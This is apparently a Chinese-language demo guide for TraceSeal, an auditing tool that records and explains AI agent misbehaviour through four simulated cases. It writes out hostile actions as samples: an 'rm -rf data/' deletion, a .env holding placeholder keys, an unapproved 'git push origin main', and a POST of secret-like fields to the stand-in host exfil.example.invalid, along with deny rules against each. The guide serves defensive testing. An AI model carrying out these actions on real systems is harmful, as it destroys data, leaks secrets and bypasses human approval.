# TraceSeal Agent 事故测试案例

> 本文合并当前可运行案例和 jimmma 分支中的演示说明。所有案例都只使用 demo 数据，不使用真实密钥，不真实 git push，不访问危险外网。

## 当前落地状态

| 案例 | 文件 | 主规则 | 风险等级 | 状态 |
|---|---|---|---|---|
| 误删数据目录 | `examples/bad_agent_delete.py` | `dangerous_delete` | critical | 已实现 |
| 写入敏感配置 | `examples/bad_agent_env.py` | `env_write` | high | 已实现 |
| 未经确认 Git push | `examples/bad_agent_git.py` | `git_push` | high | 已实现，离线模拟 |
| HTTP POST 数据外传 | `examples/bad_agent_http.py` | `suspicious_http_post` | high | 已实现，离线模拟 |

## 案例 1：误删数据目录

### 文件

`examples/bad_agent_delete.py`

### 背景

Agent 接到任务“整理项目文件”，但错误地将 `data/` 目录识别为临时文件，执行了 `rm -rf data/`，导致测试数据丢失。

### 错误行为

1. 创建 `data/important.txt`。
2. 通过 `subprocess.run()` 执行 `rm -rf data/`。
3. 后续检查发现关键文件不存在。

### TraceSeal 应记录

| 步骤 | 事件类型 | 内容 | 风险 |
|---|---|---|---|
| 1 | `file.write` | 写入 `data/important.txt` | low |
| 2 | `shell` | `rm -rf data/` | critical |
| 3 | `file.delete` / file changes | `data/important.txt` 被删除 | high/impact |

### explain 关键输出

```text
首次有害工具调用:
[evt_0003] Shell 命令: rm -rf data/

原因:
- 请求递归强制删除: data/
- 删除了受保护路径: data/
- 命中策略规则: dangerous_delete

建议策略:
deny shell "rm -rf data/**"
```

### 演示时怎么讲

1. “这个 Agent 本来只是整理文件，却删了整个 `data/` 目录。”
2. “TraceSeal 记录了每一步：写入文件、执行命令、文件被删除。”
3. “explain 自动定位到 first harmful tool call。”
4. “最后还能直接给出下一次要阻断的 policy。”

## 案例 2：写入敏感配置文件

### 文件

`examples/bad_agent_env.py`

### 背景

Agent 被要求“配置项目环境变量”，于是自动创建 `.env` 并写入示例密钥。案例中的密钥均为演示占位符，例如 `sk-demo-secret`，不包含真实凭据。

### 错误行为

1. 创建或覆盖 `.env`。
2. 写入：
   - `OPENAI_API_KEY=sk-demo-secret`
   - `DATABASE_URL=postgres://demo:demo@localhost/demo`
3. 触发 `env_write`。

### TraceSeal 应记录

| 步骤 | 事件类型 | 内容 | 风险 |
|---|---|---|---|
| 1 | `file.write` | 写入 `.env` | high |
| 2 | risk | 命中 `env_write` | high |

### explain 关键输出

```text
首次有害工具调用:
[evt_0002] 文件写入: .env

原因:
- 敏感环境配置文件被修改: .env
- 修改了受保护的环境配置文件
- 命中策略规则: env_write

建议策略:
deny file_write ".env*"
```

### 演示时怎么讲

1. “Agent 为了帮忙配置 API Key，直接创建了 `.env`。”
2. “真实项目里 `.env` 往往包含数据库密码和 Token，所以必须审计。”
3. “如果开启 block 模式，TraceSeal 会在写入前阻断。”

## 案例 3：Git push 风险

### 文件

`examples/bad_agent_git.py`

### 背景

Agent 改完文件后，未经人工确认直接执行 `git push origin main`。这会把本地状态发布到远端，跨越了本地 sandbox 的安全边界。

### 错误行为

1. 通过 `subprocess.run()` 执行 `git push origin main`。
2. TraceSeal SDK 识别并离线模拟。
3. 不真实推送远端。

### TraceSeal 应记录

| 步骤 | 事件类型 | 内容 | 风险 |
|---|---|---|---|
| 1 | `shell` | `git push origin main` | high |
| 2 | risk | 命中 `git_push` | high |

### explain 关键输出

```text
首次有害工具调用:
[evt_0002] Shell 命令: git push origin main

原因:
- 请求远程 git push
- 命中策略规则: git_push

建议策略:
require_approval git "push"
```

### 演示时怎么讲

1. “不是只有 `git push --force` 危险，普通 push 也需要人工确认。”
2. “TraceSeal 当前不会真实访问远端，而是记录一个可审计的高风险事件。”
3. “建议策略不是永远 deny，也可以是 `require_approval`。”

## 案例 4：HTTP POST 数据外传

### 文件

`examples/bad_agent_http.py`

### 背景

Agent 将包含敏感字段的 payload POST 到外部 URL。当前 demo 默认启用 `TRACESEAL_OFFLINE_HTTP=1`，因此不会真实访问该 URL。

### 错误行为

1. 构造包含 secret-like 字段的 JSON payload。
2. POST 到 `https://exfil.example.invalid/collect`。
3. TraceSeal 记录 method、url、fake status 和风险。

### TraceSeal 应记录

| 步骤 | 事件类型 | 内容 | 风险 |
|---|---|---|---|
| 1 | `http` | `POST https://exfil.example.invalid/collect` | high |
| 2 | risk | 命中 `suspicious_http_post` | high |

### explain 关键输出

```text
首次有害工具调用:
[evt_0002] HTTP 请求: POST https://exfil.example.invalid/collect

原因:
- 可疑的出站 HTTP POST: POST https://exfil.example.invalid/collect
- 命中策略规则: suspicious_http_post

建议策略:
deny http "POST https://exfil.example.invalid/collect"
```

### 演示时怎么讲

1. “这个案例展示数据外传风险。”
2. “当前为了安全和稳定，HTTP 请求是离线模拟，不依赖真实外网。”
3. “后续可以加入域名白名单、payload 脱敏和组合规则。”

## 运行全部案例

```powershell
python -m traceseal run python examples/bad_agent_delete.py
python -m traceseal explain runs/latest

python -m traceseal run python examples/bad_agent_env.py
python -m traceseal explain runs/latest

python -m traceseal run python examples/bad_agent_git.py
python -m traceseal explain runs/latest

python -m traceseal run python examples/bad_agent_http.py
python -m traceseal explain runs/latest
```

## 四个案例的演示逻辑

| 演示顺序 | 案例 | 演示重点 | 核心价值 |
|---|---|---|---|
| 1 | `bad_agent_delete.py` | `rm -rf` 被记录和标记 | 可记录、可定位 |
| 2 | `bad_agent_env.py` | `.env` 写入被识别 | 可防护 |
| 3 | `bad_agent_git.py` | `git push` 被标记且不真实推送 | 可审计 |
| 4 | `bad_agent_http.py` | 离线模拟 POST 外传 | 可回放、可扩展 |
